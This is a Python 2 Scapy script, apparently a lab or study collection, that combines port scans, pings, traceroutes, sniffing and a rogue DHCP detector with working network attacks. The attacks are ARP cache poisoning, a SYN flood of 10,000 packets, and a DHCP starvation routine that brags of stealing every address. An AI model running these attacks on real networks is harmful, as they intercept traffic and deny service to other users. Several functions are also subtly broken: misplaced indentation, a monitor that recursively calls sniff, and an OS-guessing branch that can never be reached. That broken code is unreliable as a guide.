#!/usr/bin/env python

import logging
import subprocess
import sys


# This will suppress all messages that have a lower level of seriousness than error messages.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

# Importing Scapy and handling the ImportError exception
try:
    from scapy.all import *
except ImportError:
    print "Scapy package for Python is not installed on your system."
    print "Get it from https://pypi.python.org/pypi/scapy and try again."
    sys.exit()

# Traffic sniffing using scapy
def traffic_sniffing_scapy(ip,interface):
    subprocess.call(["ifconfig", interface, "promisc"], stdout = None, stderr = None, shell = False)
    # Performing the sniffing function
    sniff(filter = "icmp and host "+ip, iface = interface, prn = lambda x: x.summary(), count = 30, timeout = 20)

# Basic Traceroute
def basic_traceroute():
    # Defining the destination name/IP
    target = 'www.google.com'
    # Performing the traceroute
    ans, unans = traceroute([target], minttl = 1, maxttl = 2, dport = [22, 23, 80], retry = 3, timeout = 2)
    # The results
    ans.show()
    # Defining the destination name/IP


# TCP SYN Traceroute
def tcp_syn_traceroute():
    target = '4.2.2.1'
    # Performing the traceroute
    ans, unans = sr(IP(dst=target, ttl=(1, 3)) / TCP(dport=53, flags="S"), timeout=5)
    # The results
    ans.summary(lambda (s, r): r.sprintf("%IP.src% --> ICMP:%ICMP.type% --> TCP:%TCP.flags%"))


# UDP Traceroute
def udp_traceroute():
    #Defining the destination name/IP
    target = '8.8.8.8'
    #Performing the traceroute
    ans,unans = sr(IP(dst = target, ttl = (1, 10))/ UDP() / DNS(qd = DNSQR(qname = "google.com")), timeout = 5)
    #The results
    #ans.summary()
    ans.summary(lambda(s, r) : r.sprintf("%IP.src%"))

# DNS Traceroute
def dns_traceroute():
    #Defining the destination name/IP
    target = '8.8.8.8'
    #Performing the traceroute
    ans,unans = traceroute(target, maxttl = 10, timeout = 5, l4 = UDP(sport = RandShort()) / DNS(qd = DNSQR(qname = "www.google.com")))

# TCP SYN Scan
def tcp_syn_scan_scan():
    #Defining the destination name/IP
    #target = '172.16.1.2'
    target = '172.16.1.3'
    #Performing the scan - multiple ports
    ans, unans = sr(IP(dst = target) / TCP(sport = RandShort(), dport = [111, 135, 22], flags = "S"), timeout = 5)
    #The results, based on open/closed ports
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "18":
            print str(sent[TCP].dport) + " is OPEN!"
        elif received.haslayer(TCP) and str(received[TCP].flags) == "20":
            print str(sent[TCP].dport) + " is closed!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is filtered!"

'''
An attacker uses a SYN scan to determine the status of ports on the remote target.
RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service.
When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated.
When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered.
Source: https://capec.mitre.org/data/definitions/287.html
'''

# TCP ACK Scan
def tcp_ack_scan():
    #Defining the destination name/IP
    #target = '172.16.1.2'
    target = '172.16.1.3'
    #Performing the scan
    ans, unans = sr(IP(dst = target)/TCP(dport = [111, 135, 22], flags = "A"), timeout = 5)
    #The results, based on filtered/unfiltered ports
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "4":
            print str(sent[TCP].dport) + " is UNFILTERED!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is filtered!"
'''
An attacker uses TCP ACK segments to gather information about firewall or ACL configuration.
The purpose of this type of scan is to discover information about filter configurations rather than port state.
When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered.
When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port.
Source: https://capec.mitre.org/data/definitions/305.html
'''


# TCP FIN Scan
def tcp_fin_scan():
    #Defining the destination name/IP
    target = '172.16.1.2'
    #target = '172.16.1.3'
    #Performing the scan - multiple ports
    ans, unans = sr(IP(dst = target) / TCP(sport = RandShort(), dport = [111, 135, 22], flags = "F"), timeout = 5)
    #The results, based on open/closed ports
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "20":
            print str(sent[TCP].dport) + " is closed!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is open/filtered!"

'''
An attacker uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response.
Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some
operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.
Source: https://capec.mitre.org/data/definitions/302.html
'''

# TCP Xmas Scan
def tcp_xmas_scan():
    #Defining the destination name/IP
    #target = '172.16.1.2'
    target = '172.16.1.3'
    #Performing the scan
    ans, unans = sr(IP(dst = target) / TCP(dport = [111, 135, 22], flags = "FPU"), timeout = 5)
    #The results based on closed ports
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "20":
            print str(sent[TCP].dport) + " is closed!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is open/filtered!"
'''
An attacker uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the all flags sent in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response.
Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.
Source: https://capec.mitre.org/data/definitions/303.html
'''

# TCP Null Scan
def tcp_null_scan():
    #Defining the destination name/IP
    #target = '172.16.1.2'
    target = '172.16.1.3'
    #Performing the scan
    ans, unans = sr(IP(dst = target) / TCP(sport = RandShort(), dport = [111, 135, 22], flags = 0, seq = 0), timeout = 5)
    #The results based on closed ports
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "20":
            print str(sent[TCP].dport) + " is closed!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is open/filtered!"

'''
An attacker uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.
Many operating systems, however, do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.
Source: https://capec.mitre.org/data/definitions/304.html
'''

# TCP Port Scan
def tcp_port_scan():
    #Defining the destination name/IP
    #target = '172.16.1.2'
    target = '172.16.1.3'
    #Performing the scan
    ans, unans = sr(IP(dst = target) / TCP(flags = "S", dport = (1, 1024)), timeout = 5, verbose = 0)
    #The results, based on open/closed ports
    #Send a TCP SYN on each port. Wait for a SYN-ACK or a RST or an ICMP error (secdev.org)
    for sent, received in ans:
        if received.haslayer(TCP) and str(received[TCP].flags) == "18":
            print str(sent[TCP].dport) + " is OPEN!"
        elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
            print str(sent[TCP].dport) + " is filtered!"
    #Handling unanswered packets
    for sent in unans:
        print str(sent[TCP].dport) + " is filtered!"
        print "\nAll other ports are closed.\n"

# ARP Ping
def arp_ping():
    #Performing the ping - discovering hosts on a local Ethernet network
    #ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff") / ARP(pdst = "172.16.1.0/24"), timeout = 5, iface = "enp0s3")
    #ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
    #Using the builtin function
    arping("172.16.1.*")

# ICMP Ping
def icmp_ping():
    #Performing the ping
    ans, unans = sr(IP(dst = "172.16.1.2-10") / ICMP(), timeout = 3, iface = "enp0s3")
    #The results
    ans.summary(lambda(s,r): r.sprintf("%IP.src% is UP!"))

# TCP Ping
def tcp_ping():
    #Performing the ping
    #In cases where ICMP echo requests are blocked, we can still use various TCP Pings such as TCP SYN Ping.
    #Any response to our probes will indicate a live host. Source: secdev.org
    ans, unans = sr(IP(dst = "172.16.1.1-5") / TCP(dport = 111, flags = "S"), timeout = 2, iface = "enp0s3")
    #The results
    ans.summary(lambda(s,r): r.sprintf("%IP.src% is UP!"))

# UDP Ping
def udp_ping():
    #Performing the ping
    #UDP Ping will produce ICMP Port unreachable errors from live hosts.
    #Here you can pick any port which is most likely to be closed, such as port 0.
    ans, unans = sr(IP(dst = "172.16.1.1-5") / UDP(dport = 0), timeout = 5, iface = "enp0s3")
    #The results
    ans.summary(lambda(s,r): r.sprintf("%IP.src% is UP!"))

# Basic ARP Monitor
def arp_monitor(packet):
    if ARP in packet and packet[ARP].op == 1: #ARP Request (who-has ...?)
        return "ARP Request: Device " + packet[ARP].psrc + " asking about: " + packet[ARP].pdst
    elif ARP in packet and packet[ARP].op == 2: #ARP Reply (is-at ...)
        return "ARP Response: Device " + packet[ARP].hwsrc + " has this address: " + packet[ARP].psrc
    #Performing the monitoring
    sniff(prn = arp_monitor, filter = "arp", count = 20, store = 0)

# ARP Cache Poisoning
def arp_cache_poisoning():
    #Defining the destination (broadcast) MAC address
    target = 'ff:ff:ff:ff:ff:ff'
    #ARP cache poisoning
    send(ARP(hwsrc = get_if_hwaddr("enp0s3"), psrc = '172.16.1.233', hwdst = target, pdst = '172.16.1.3'), iface = "enp0s3")

# SYN Flooding
def syn_flooding():
    #Defining the target machine
    target = '172.16.1.2'
    #Defining the packet structure
    packet = IP(dst = target) / TCP(sport = RandShort(), dport = 111, seq = 333, flags = "S")
    #Sending the packet in a loop
    srloop(packet, inter = 0.1, retry = 2, timeout = 5, count = 10000)

# DHCP Starvation – Windows Server
def dhcp_starvation():
    #Setting network interface in promiscuous mode
    subprocess.call(["ifconfig", "enp0s3", "promisc"], stdout = None, stderr = None, shell = False)
    #Scapy normally makes sure that replies come from the same IP address the stimulus was sent to.
    #But our DHCP packet is sent to the IP broadcast address (255.255.255.255) and any answer packet will have the IP address of the replying DHCP server as its source IP address (e.g. 192.168.1.111).
    #Because these IP addresses don't match, we have to disable Scapy's check with conf.checkIPaddr = False before sending the stimulus.
    conf.checkIPaddr = False
    #Defining the number of DHCP packets to be sent
    pkt_no = 255
    #Performing the DHCP starvation attack
    #Generating entire DHCP sequence
    def generate_dhcp_seq():
        #Defining some DHCP parameters
        x_id = random.randrange(1, 1000000)
        hw = "00:00:5e" + str(RandMAC())[8:]
        hw_str = mac2str(hw)
        #print hw
        #Assigning the .command() output of a captured DHCP DISCOVER packet to a variable
        dhcp_dis_pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = hw) / IP(src = "0.0.0.0", dst = "255.255.255.255") / UDP(sport = 68, dport = 67) / BOOTP(op = 1, xid = x_id, chaddr = hw_str) / DHCP(options = [("message-type", "discover"), ("end")])
        #Sending the DISCOVER packet and catching the OFFER reply
        #The first element of ans is the DISCOVER packet, the second is the OFFER packet
        ans, unans = srp(dhcp_dis_pkt, iface = "enp0s3", timeout = 2.5, verbose = 0)
        #The IP offered by the DHCP server to the client is extracted from the received answer (OFFER)
        offered_ip = ans[0][1][BOOTP].yiaddr
        #Assigning the .command() output of a captured DHCP REQUEST packet to a variable
        dhcp_req_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src = hw) / IP(src = "0.0.0.0", dst = "255.255.255.255") / \
                       UDP(sport = 68, dport = 67) / BOOTP(op = 1, xid = x_id, chaddr = hw_str) / \
                       DHCP(options = [("message-type", "request"), ("requested_addr", offered_ip), ("end")])
        #Sending the REQUEST for the offered IP address.
        #The server will respond with a DHCP ACK and the IP address will be leased.
        srp(dhcp_req_pkt, iface = "enp0s3", timeout = 2.5, verbose = 0)
    #Calling the function
    try:
        for iterate in range(0, int(pkt_no)):
            generate_dhcp_seq()
    except IndexError:
        print "\nDone. No more addresses to steal! :)\n"

# Rogue DHCP Server Detector
def rogue_dhcp_server_detector():
    #Setting the checkIPaddr parameter to False
    conf.checkIPaddr = False
    #Getting the hardware address
    hw = get_if_raw_hwaddr("enp0s3")[1]
    #Creating the DHCP Discover packet
    dhcp_discover = Ether(dst = "ff:ff:ff:ff:ff:ff") / IP(src = "0.0.0.0", dst = "255.255.255.255") / UDP\
        (sport = 68, dport = 67) / BOOTP(chaddr = hw) / DHCP(options = [("message-type", "discover"), "end"])
    #Sending the Discover packet and accepting multiple answers for the same Discover packet
    ans, unans = srp(dhcp_discover, multi = True, iface = "enp0s3", timeout = 5, verbose = 0)
    #Defining a dictionary to store mac-ip pairs
    mac_ip = {}
    for reply in ans:
        mac_ip[reply[1][Ether].src] = reply[1][IP].src
        #Printing the results
        print "\nActive DHCP servers currently residing on your LAN:\n"
    for mac, ip in mac_ip.iteritems():
        print "IP Address: %s, MAC Address: %s\n" % (ip, mac)

# Basic NMAP Application
def nmap_scanner():
    #Defining the destination names/IPs and ports and the exiting interface
    targets = ['172.16.1.2', '172.16.1.3', '172.16.1.150', '172.16.1.100']
    ports = [50743, 111, 135, 22]
    interface = "enp0s3"
    #Defining the TCP scan function
    def tcp_scan(target, port):
        #Creating a list for the open ports
        open_ports = []
        #Performing the scan - multiple ports
        ans, unans = sr(IP(dst = target) / TCP(sport = RandShort(), dport = port, flags = "S"), timeout = 2, iface = interface, verbose = 0)
        #The results, based on open/closed ports
        for sent, received in ans:
            if received.haslayer(TCP) and str(received[TCP].flags) == "18":
                print str(sent[TCP].dport) + " is OPEN!"
                open_ports.append(int(sent[TCP].dport))
            elif received.haslayer(TCP) and str(received[TCP].flags) == "20":
                print str(sent[TCP].dport) + " is closed!"
            elif received.haslayer(ICMP) and str(received[ICMP].type) == "3":
                print str(sent[TCP].dport) + " is filtered!"
        #Handling unanswered packets
        for sent in unans:
            print str(sent[TCP].dport) + " is filtered!"
            return open_ports
    #Checking hosts via ICMP
    def icmp_scan():
        for target in targets:
            ping_reply = srp1(Ether() / IP(dst = target) / ICMP(), timeout = 2, iface = interface, verbose = 0)
        if str(type(ping_reply)) == "<type 'NoneType'>" or ping_reply.getlayer(ICMP).type == "3":
            print "\n---> Host with IP address %s is down or unreachable." % target
        else:
            print "\n\n---> Host with IP address %s and MAC address %s is up." % (target, ping_reply[Ether].src)
            print "\nTCP Ports:\n"
        #Calling the TCP scanning function
        open_ports = tcp_scan(target, ports)
        if len(open_ports) > 0:
            pkt = sr1(IP(dst = target) / TCP(dport = open_ports[0], flags = "S"), timeout = 2, iface = interface, verbose = 0)
            ttl = str(pkt[IP].ttl)
            window = str(pkt[TCP].window)
        #print ttl, window
        #Identifying the host OS based on the TTL and Window Size values in 'pkt'
        if ttl == "128" and window == "65535":
            print "\nGuessing OS type... Windows XP.\n"
        elif ttl == "128" and window == "16384":
            print "\nGuessing OS type... Windows 2000/Server 2003.\n"
        elif ttl == "128" and window == "8192":
            print "\nGuessing OS type... Windows 7/Vista/Server 2008.\n"
        elif ttl == "64" and window == "5840":
            print "\nGuessing OS type... Linux Kernel 2.x.\n"
        elif ttl == "64" and window == "14600":
            print "\nGuessing OS type... Linux Kernel 3.x.\n"
        elif ttl == "64" and window == "65535":
            print "\nGuessing OS type... FreeBSD.\n"
        elif ttl == "64" and window == "5720":
            print "Guessing OS type... Chrome OS/Android.\n"
        elif ttl == "255" and window == "4128":
            print "Guessing OS type... Cisco IOS 12.4.\n"
        elif ttl == "64" and window == "65535":
            print "Guessing OS type... MAC OS.\n"
        else:
            print "Cannot detect host OS --> no open ports found."
    #Running the function
    icmp_scan()


traffic_sniffing_scapy("ip" , "interface")
basic_traceroute()